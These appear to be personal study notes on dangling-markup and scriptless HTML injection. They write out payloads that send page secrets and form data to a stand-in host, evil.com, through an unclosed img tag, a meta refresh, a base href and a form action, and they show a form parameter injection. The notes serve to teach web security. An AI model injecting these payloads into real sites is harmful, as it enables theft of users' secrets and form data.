# TOPIC
HTML Scriptless Attacks / Dangling Markup Attacks (Wrap)

# OVERVIEW
This is the final part of the HTML Scriptless attack vector series.

# ATTACKS
## STEALING CLEAR TEXTS
- The injection of img tag, is very interesting.
- On injection it would look like, "<img src=https://evil.com?"  ,THe injection of this would treat all the following code as the query parameter, and ends on seeing a '.
- If there are any secrets in between it gets exposed to the evil.com site.
- This is also possible with the meta tag, in case if <img> tags are blocked.
- "<meta http-equic="refresh" content="4; URL='http://evil.com/log.cgi?"

## STEALING FORM DATA
- The injection of <base href="https://evil.com">, would attach this prefix to all the paths like "/action.php", "/dashboard.php".
- We can also set a former form header : <form action="https://evil.com/log.cgi"> and this would override all other form headers if present.

## FORM PARAMETER INJECTION
- You can change the path of a form, and insert new values so an unexpected result may come.
- <form action="/editSettings.php">
 <input type='hidden' name='invite User' value='Eddard Stark'>    ----> INJECTED
 .
 .
 .
 .
 .
 <form action="/editSettings.php">     -----> Existing FORM ( ignored )
<input type="text" name="invite User" value="">
</form>


## OTHERS
 - Bypassing CSP with the User Interaction : https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup

# REFERENCES

a. https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
b. https://github.com/cure53/HTTPLeaks/blob/main/leak.html
c. https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup

